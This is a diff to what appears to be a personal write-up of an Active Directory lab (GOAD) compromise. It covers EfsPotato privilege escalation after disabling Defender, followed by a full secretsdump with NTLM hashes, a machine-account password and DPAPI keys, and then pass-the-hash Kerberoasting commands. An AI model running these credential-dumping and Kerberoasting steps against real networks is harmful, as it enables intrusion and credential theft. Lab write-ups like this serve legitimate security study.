@@ -197,12 +197,105 @@ we have privilege `SeImpersonate` enabled. there's heavy AV guard present.
 <img width="654" height="437" alt="image" src="https://github.com/user-attachments/assets/939db9a9-88ff-4b72-a80e-3363791c1bd9" />
 
 we got our flag on .22. 
+<br></br>
+
+
+- Escalating privilege using EfsPotato
+
+<img width="1542" height="292" alt="image" src="https://github.com/user-attachments/assets/fd439e8e-e647-4825-b09e-cddeacc33012" />
+
+trust me this took 16 hours to evade, it flagged the binary now, i had to turn off the Defender to execute this. 😭 the lab Defense is hell. I changed the administrator password.
+<br></br>
+
+- Getting root flag on .22
+
+<img width="1356" height="414" alt="image" src="https://github.com/user-attachments/assets/75f13a14-0830-424d-84e5-97d647d2b169" />
+
+we got the flag.
+<br></br>
 
 
 
 
+#### Post Exploitation 
+
+```shell
+┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/GOAD]
+└─$ impacket-secretsdump Administrator@192.168.56.22
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+Password:
+[*] Service RemoteRegistry is in stopped state
+[*] Starting service RemoteRegistry
+[*] Target system bootKey: 0xe27efa9d2e2a45b42cfb6da61636180c
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:6d587fe93bb333e51b07759bc056d261:::
+vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
+nighthawk:1002:aad3b435b51404eeaad3b435b51404ee:9cd837f340f7b1768b2b7c97274c2eb6:::
+[*] Dumping cached domain logon information (domain/username:hash)
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC 
+ACADEMY\SQL$:aes256-cts-hmac-sha1-96:7016df08aa72ceb3665832f500692d01fcc6b399b91e93ff5b98e710aeab8372
+ACADEMY\SQL$:aes128-cts-hmac-sha1-96:ed902032e6ae4970d850acb8b39fa571
+ACADEMY\SQL$:des-cbc-md5:e9c1321a1a19f2f8
+ACADEMY\SQL$:plain_password_hex:580071004500700044005a002e0034006e0068003500200021004d003400770076002d006700370077003500620042003a006b006e005e006a00410040003f0077004000460069005d004f005100780052002b006e002f005400250058002b007a0037006f002c0032005d003d0036002900420049002000540031003c002400270040003e0024004a0034003b007900400030002a00530070002900410058002200200079007100610056006c004a0051003d00680072003b0039004a007000680078004a007400590074002400300049003f0063002900350068004800730022002a00570035007000460068002c00
+ACADEMY\SQL$:aad3b435b51404eeaad3b435b51404ee:b0bf9268ebc9c75d9c13f25f5a33e751:::
+[*] DPAPI_SYSTEM 
+dpapi_machinekey:0x8abc51c852f35b14a68334ff3539e1524242be26
+dpapi_userkey:0xdfd50720f5aff1df52feb1fac43dd78ad9dcf0fe
+[*] NL$KM 
+ 0000   6A 2F A7 33 55 6E B4 2D  26 EA 27 3B 9B C0 A2 5C   j/.3Un.-&.';...\
+ 0010   D6 5C CC CC 8C 6A 7B 82  D1 83 BC 0B 4F 1A 89 42   .\...j{.....O..B
+ 0020   66 4F 98 75 84 97 FF AE  F4 C4 7A 60 0D 6A 41 DA   fO.u......z`.jA.
+ 0030   75 B3 F0 BD 65 28 BD 52  06 8C 06 AA DB BB A1 9A   u...e(.R........
+NL$KM:6a2fa733556eb42d26ea273b9bc0a25cd65ccccc8c6a7b82d183bc0b4f1a8942664f98758497ffaef4c47a600d6a41da75b3f0bd6528bd52068c06aadbbba19a
+[*] Cleaning up... 
+[*] Stopping service RemoteRegistry
+```
+we dumped domain credentials. 
+<br></br>
+
+- Using users cred `SQL$`
+
+<img width="1583" height="238" alt="image" src="https://github.com/user-attachments/assets/0011b665-c916-4e21-948d-374b530daced" />
+
+we have access to every other machines except the other DC 
+<br></br>
+
+- Keberoasting with the credential
+
+```shell
+┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/GOAD]
+└─$ impacket-GetUserSPNs -dc-ip 192.168.56.20 -outputfile hashes.asreproast academy.ninja.lan/'SQL$' -hashes :b0bf9268ebc9c75d9c13f25f5a33e751 
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+ServicePrincipalName                 Name     MemberOf                                        PasswordLastSet             LastLogon                   Delegation  
+-----------------------------------  -------  ----------------------------------------------  --------------------------  --------------------------  -----------
+eventlog/share.academy.ninja.lan     frank    CN=Teacher,CN=Users,DC=academy,DC=ninja,DC=lan  2026-08-19 22:13:12.900960  2026-08-20 20:06:11.137606  constrained 
+HTTP/WEB.academy.ninja.lan           frank    CN=Teacher,CN=Users,DC=academy,DC=ninja,DC=lan  2026-08-19 22:13:12.900960  2026-08-20 20:06:11.137606  constrained 
+MSSQLSvc/sql.academy.ninja.lan       sql_svc                                                  2026-08-19 22:13:17.400843  <never>                                 
+MSSQLSvc/sql.academy.ninja.lan:1433  sql_svc                                                  2026-08-19 22:13:17.400843  <never>                                 
 
 
+
+[-] CCache file is not found. Skipping...
+[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
+```
+we have an error, clock skew too great. 
+
+<img width="1917" height="689" alt="image" src="https://github.com/user-attachments/assets/fcdf6163-f826-4219-bc7a-4f113a082bc9" />
+
+fixed it, we got users tgs hashes. 
+
+> command
+
+```shell
+┌──(n16hth4wk㉿n16hth4wk-sec)-[~/Documents/GOAD]
+└─$ nxc ldap ips.txt -u 'SQL$' -H b0bf9268ebc9c75d9c13f25f5a33e751 --kerberoasting hashes.asreproast
+```
 
 
 
